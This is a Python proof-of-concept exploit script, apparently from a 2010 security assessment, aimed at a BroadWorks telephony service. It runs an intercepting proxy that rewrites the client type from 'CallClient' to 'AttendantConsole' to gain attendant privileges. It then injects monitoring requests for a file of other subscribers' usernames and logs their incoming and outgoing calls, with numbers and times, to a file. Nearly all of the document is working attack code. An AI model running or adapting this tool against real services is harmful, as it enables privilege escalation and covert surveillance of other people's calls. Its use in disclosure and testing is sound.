#!/usr/env/python
# Nick Freeman | vt  [ nick.freeman@security-assessment.com ] May 2k10

# When running the proxy, each request prompts for k, m, i or your input:
#
# K/Enter - forwards the packet
# m 	  - automodifies the packet (see changeme and automod variables)
# i 	  - prompts for a file containing usernames in the 098765@sp.com format
# input	  - sends your raw input (i.e., paste an XML message in there)
#
# When you're auth'd and ready to monitor other users, generate a packet to BroadWorks (address book update for example), select 'i' and specify a file with usernames in it.

import socket, ssl, sys, re, time
from xml.dom import minidom


# define local listening ip, port
lhost = '127.0.0.1'
lport = 1111

# define dest host, port, and domain
dhost = ''
dport = 1111
ddomregex = '@serviceprovider\.com.*' # SP's domain name, only regexd

# define automod
changeme = 'CallClient' # the string to automagically change
tothis = 'AttendantConsole' # what you want it to automagically change to

# define injection params
userUid = '' # userUid of YOUR user (with AttendantConsole privs)
applicationId = 'Client License 4'
monitorpacket = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><BroadsoftDocument protocol="CAP" version="14.0"><command commandType="monitoringUsersRequest"><commandData><user 
userType="AttendantConsole" userUid="' + userUid + '"><applicationId>'  + applicationId + '</applicationId><monitoring monType="Add"/>QQQQ</user></commandData></command></BroadsoftDocument>'
monUserLine = '<monUser>ZZ</monUser>'

# define logfile
logfile = 'call-logs.txt'

# the listener
ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ls.bind((lhost, lport))
print "+ Bound to port " + `lport`
ls.listen(1)
print "+ Listening..\n"

# the sender
ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sds = ssl.wrap_socket(ds)

# start listening
lconn, addr = ls.accept()
print '+ Connected by', addr

# connect to remote host
sds.connect((dhost, dport))
print '+ Connected to remote host'

def local_packetgrab():
	ldata = ""
	lconn.settimeout(1)
	try:
		ldata = lconn.recv(2048)
		if len(ldata) < 5:
			return 'nodata'
		# debug
		#print ">>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		#print "Received data from client:\n"
		#print ">>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		#print ldata
		# We have received some data, lets check if its finished or not
		while 1:
		    line = ""
		    try:
			line = lconn.recv(2048)
			# debug
			#print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
			#print "Received more data from client:\n"
			#print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
			#print line
			ldata += line
		    except socket.timeout:
			# debug
			#print "No additional data received."
			break

		    # possibly not necessary
	            if line == "":
        	        break

	except socket.timeout:
		# No data received from client
		return 'nodata'
	
	if len(ldata) > 5:
		print ">>>>>>>>>>>>>>>>>\n"
		print "Data from client:\n"
		print ">>>>>>>>>>>>>>>>>\n"
		print ldata 
		return ldata
	else:
		# No data received from client
		return 'nodata'


def remote_packetgrab():
	ddata = ""
	sds.settimeout(1)
	try:
		ddata = sds.recv(2048)
		# debug
		#print "<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
		#print "Received data from server:\n"
		#print "<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
		#print ddata
		# We have received from data, lets check if its finished or not
		while 1:
			dline = ""
			try:
				dline = sds.recv(2048)
				# debug
				#print "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
				#print "Received more data from server:\n"
				#print "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n"
				#print dline
				ddata += dline
			except:
				# debug
				#print "No additional data received.\n"
				break

	except:
		# No data received from server
		return 'nodata'

	if len(ddata) > 5:
		print "<<<<<<<<<<<<<<<<<\n"
		print "Data from server:\n"
		print "<<<<<<<<<<<<<<<<<\n"
		print ddata

		# do CDR grab

		if re.search('callUpdate', ddata):
			logme = open(logfile, 'a')
			# it be a call packet
			xmldoc = minidom.parseString(ddata)
			if re.search('remoteTelUri', ddata):
			   if re.search('\<state\>2', ddata):
				# it be an incoming call
				callTo = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml()
				callTo = re.sub('\<monitoredUserId\>', '', callTo)
				callTo = re.sub(ddomregex, '', callTo)


				callFrom = xmldoc.getElementsByTagName('remoteTelUri')[0].toxml()
				callFrom = re.sub('\<remoteTelUri\>tel\:', '', callFrom)
				callFrom = re.sub('\<\/remote.*', '', callFrom)				
				localtime = time.asctime( time.localtime(time.time()) )
				logstring = "[" + localtime + "]: Incoming call to " + callTo + " from " + callFrom + "!\n"
				logme.write(logstring)
				print logstring
				logme.close()
			else:
			   if re.search('\<state\>2', ddata):
				# it be an outgoing call
				callFrom = xmldoc.getElementsByTagName('monitoredUserId')[0].toxml()
				callFrom = re.sub('\<monitoredUserId\>', '', callFrom)
				callFrom = re.sub(ddomregex, '', callFrom)


				callTo = xmldoc.getElementsByTagName('remoteNumber')[0].toxml()
				callTo = re.sub('\<remoteNumber\>', '', callTo)
				callTo = re.sub('\<\/remote.*', '', callTo)				

				localtime = time.asctime( time.localtime(time.time()) )
				logstring = "[" + localtime + "]: Outgoing call from " + callFrom + " to " + callTo + "!\n"
				logme.write(logstring)
				print logstring
				logme.close()


		return ddata
	else:
		# No data received from server
		return 'nodata'


def packet_handle(packet):
	user_input = raw_input("ACTION: 'k', 'm', 'i' or your input:\n-------------------------------\n")
	if user_input == 'k' or user_input == '':
		print "Sending request as is..\n"
		print "-----------------------\n"
		return packet
	elif user_input == 'm':
		print "Sending auto-modded request..\n"
		print "-----------------------------\n"
		packet = re.sub(changeme, tothis, packet)
		return packet
	elif user_input == "i":
		filename = raw_input("Input file containing usernames:\n--------------------------------\n");
		try:
			file = open(filename, 'r')
		except: 
			filename = raw_input("File does not exist. Try again:\n-------------------------------\n")
		file_line = 0

		injection_input = ''
		for each_line in file:
			print "Read line: " + each_line
			mond_user = re.sub('ZZ', each_line, monUserLine)
			injection_input = injection_input + mond_user
			file_line = file_line + 1
			if file_line >= 100:
				evilpacket = re.sub('QQQQ', injection_input, monitorpacket)
				print "Sending injection packet.."
				print "--------------------------\n"
				evilpacket = re.sub('\n', '', evilpacket)
				print evilpacket
				sds.send(evilpacket)
				file_line = 0
						

		# we have now got 100 users to add. send the packet, then continue sorting through users.			
		if len(injection_input) > 10:
			evilpacket = re.sub('QQQQ', injection_input, monitorpacket)
			print "Sending injection packet.."
			print "--------------------------\n"
			evilpacket = re.sub('\n', '', evilpacket)
			print evilpacket
			sds.send(evilpacket)
		
		# after all injection is done, return initial packet
		file.close()
		return packet

	else:
		print "Sending modified packet..\n"
		print "-------------------------\n"
		return user_input
	



while 1:
	# Debug
	#print "Checking for client packet..\n"
	print ">"
	local_data = local_packetgrab()
	if local_data != 'nodata' and len(local_data) > 5:
		lpacket_tosend = packet_handle(local_data)
		sds.send(lpacket_tosend)

	# Debug
	#print "Checking for server packet..\n"
	print "<"
	remote_data = remote_packetgrab()
	if remote_data != 'nodata' and len(remote_data) > 5:
		rpacket_tosend = packet_handle(remote_data)
		lconn.send(rpacket_tosend)
